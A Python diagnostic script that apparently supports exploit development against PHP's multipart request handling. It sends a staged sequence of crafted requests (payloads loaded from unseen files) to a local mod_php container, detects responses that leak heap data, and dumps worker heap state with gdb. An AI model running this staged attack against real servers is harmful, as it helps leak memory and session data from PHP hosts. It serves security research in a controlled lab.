#!/usr/bin/env python3
"""Diagnose per-child heap addresses and A2 dangling state on a real multi-worker mod_php.

Sequence: restart -> A1 -> n x B1 (sequential) -> n x A2 (sequential) -> dump each
unique child's PS state (main chunk, id, hsv) via gdb.

No B2 is sent, so nothing crashes during the diagnostic.
"""
import argparse, json, os, re, socket, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import probe_state as P


def send_plain(port, path, body, timeout=240):
    req = ("POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (path, port, "CCCCCCCCCC", len(body))).encode()
    out = bytearray()
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req + body)
        while len(out) < (8 << 20):
            c = s.recv(65536)
            if not c:
                break
            out.extend(c)
    except OSError:
        pass
    finally:
        s.close()
    return bytes(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--a2", required=True)
    ap.add_argument("--n", type=int, default=5)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--keep", action="store_true", help="do not restart the container")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    rec = {"a1": {}, "b1": [], "a2": [], "dumps": {}}
    if not args.keep:
        subprocess.run(["docker", "restart", args.container], capture_output=True)
        time.sleep(1.5)
    try:
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n"); s.recv(1024); s.close()
    except OSError:
        pass
    subprocess.run("docker exec -i -u root %s sh -c 'cat > /tmp/dump_state.gdb' < %s/dump_state.gdb"
                   % (args.container, HERE), shell=True)
    P.reset_log(args.container)

    # A1
    n, status = P.send_chunked(args.port, "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v", args.a1)
    time.sleep(0.15)
    a1_pid = P.last_pid(args.container)
    rec["a1"] = {"bytes": n, "status": status, "pid": a1_pid}
    print("A1", rec["a1"], flush=True)

    # B1 sequential
    for i in range(args.n):
        save = os.path.join(args.outdir, "b1_%d.resp" % i)
        n, status = P.send_chunked(args.port, "/index.php", args.b1, save=save)
        time.sleep(0.1)
        pid = P.last_pid(args.container)
        row = {"i": i, "bytes": n, "status": status, "pid": pid}
        data = open(save, "rb").read() if os.path.exists(save) else b""
        row["leak"] = b"Set-Cookie: PHPSESSID=" in data and len(data) > 100000
        rec["b1"].append(row)
        print("B1", row, flush=True)

    b1_pids = [r["pid"] for r in rec["b1"] if r["leak"]]
    print("leak pids", b1_pids, flush=True)

    # A2 sequential
    a2 = open(args.a2, "rb").read()
    for i in range(args.n):
        resp = b""
        try:
            resp = send_plain(args.port, "/index.php", a2)
        except OSError:
            pass
        time.sleep(0.1)
        pid = P.last_pid(args.container)
        rec["a2"].append({"i": i, "bytes": len(resp), "pid": pid})
        print("A2", rec["a2"][-1], flush=True)

    # dump every unique pid seen
    pids = [rec["a1"]["pid"]] + [r["pid"] for r in rec["b1"]] + [r["pid"] for r in rec["a2"]]
    for pid in sorted(set(p for p in pids if p)):
        st = P.dump(args.container, pid)
        rec["dumps"][pid] = st
        print("DUMP", pid, st, flush=True)

    # summary
    leak = set(b1_pids)
    for pid, st in rec["dumps"].items():
        st["role"] = ("leak" if pid in leak else "") + ("+a2" if any(r["pid"] == pid for r in rec["a2"]) else "")
    json.dump(rec, open(os.path.join(args.outdir, "diag.json"), "w"), indent=1)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
